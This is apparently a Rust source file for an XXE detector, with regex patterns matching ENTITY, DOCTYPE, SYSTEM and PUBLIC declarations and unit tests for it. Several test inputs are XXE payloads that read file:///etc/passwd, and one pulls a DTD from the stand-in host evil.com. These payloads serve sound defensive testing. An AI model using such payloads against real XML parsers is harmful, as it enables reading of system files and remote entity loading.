// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use regex::Regex;
use std::sync::LazyLock;

use crate::{AttackCategory, DetectionResult, Detector, Severity};

static PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"(?i)<!ENTITY\s+").unwrap(),
        Regex::new(r#"(?i)SYSTEM\s+["']"#).unwrap(),
        Regex::new(r#"(?i)PUBLIC\s+["']"#).unwrap(),
        Regex::new(r"(?i)<!ENTITY\s+%").unwrap(),
        Regex::new(r"(?i)<!DOCTYPE\s+").unwrap(),
    ]
});

pub struct XxeDetector;

impl Detector for XxeDetector {
    fn name(&self) -> &'static str {
        "xxe"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        for re in PATTERNS.iter() {
            if let Some(m) = re.find(input) {
                return Some(DetectionResult {
                    attack_type: "xxe".into(),
                    category: AttackCategory::Protocol,
                    severity: Severity::Critical,
                    matched_pattern: m.as_str().to_string(),
                    offset: m.start(),
                    message: "XXE XML External Entity attack detected".into(),
                });
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_detected(input: &str) {
        let r = XxeDetector.detect(input).expect("expected xxe detection");
        assert_eq!(r.attack_type, "xxe");
        assert_eq!(r.category, AttackCategory::Protocol);
        assert_eq!(r.severity, Severity::Critical);
        assert!(!r.matched_pattern.is_empty());
        assert!(r.offset <= input.len());
        assert_eq!(
            &input[r.offset..r.offset + r.matched_pattern.len()],
            r.matched_pattern
        );
        assert!(!r.message.is_empty());
    }

    fn assert_clean(input: &str) {
        assert!(
            XxeDetector.detect(input).is_none(),
            "not detected: {input:?}"
        );
    }

    #[test]
    fn name_is_xxe() {
        assert_eq!(XxeDetector.name(), "xxe");
    }

    #[test]
    fn detects_inline_entity() {
        assert_detected("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">");
    }

    #[test]
    fn detects_doctype_declaration() {
        assert_detected(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        );
    }

    #[test]
    fn detects_parameter_entity() {
        assert_detected("<!ENTITY % param SYSTEM \"http://evil.com/xxe.dtd\">");
    }

    #[test]
    fn detects_public_entity() {
        assert_detected(
            "<!ENTITY xxe PUBLIC \"-//W3C//DTD XHTML 1.0//EN\" \"file:///etc/passwd\">",
        );
    }

    #[test]
    fn detects_mixed_case_markup() {
        assert_detected("<!entity xxe system \"file:///etc/passwd\">");
        assert_detected("<!doctype foo>");
    }

    #[test]
    fn rejects_benign_xml() {
        assert_clean("<note><to>Joe</to><from>Bob</from><body>Hi</body></note>");
        assert_clean("<ENTITY>plain text</ENTITY>");
        assert_clean("<!DOCTYPEfoo>");
        assert_clean("SYSTEM\"file:///etc/passwd\"");
        assert_clean("<!ENTITY>");
    }

    #[test]
    fn rejects_near_misses() {
        assert_clean("<!ENTITYxxe>");
        assert_clean("<!ENTITY%xxe>");
        assert_clean("SYSTEM /etc/passwd");
    }

    #[test]
    fn rejects_empty_and_whitespace() {
        assert_clean("");
        assert_clean("   ");
    }

    #[test]
    fn rejects_unicode_text() {
        assert_clean("这是一段普通的中文 XML 描述文本");
    }
}
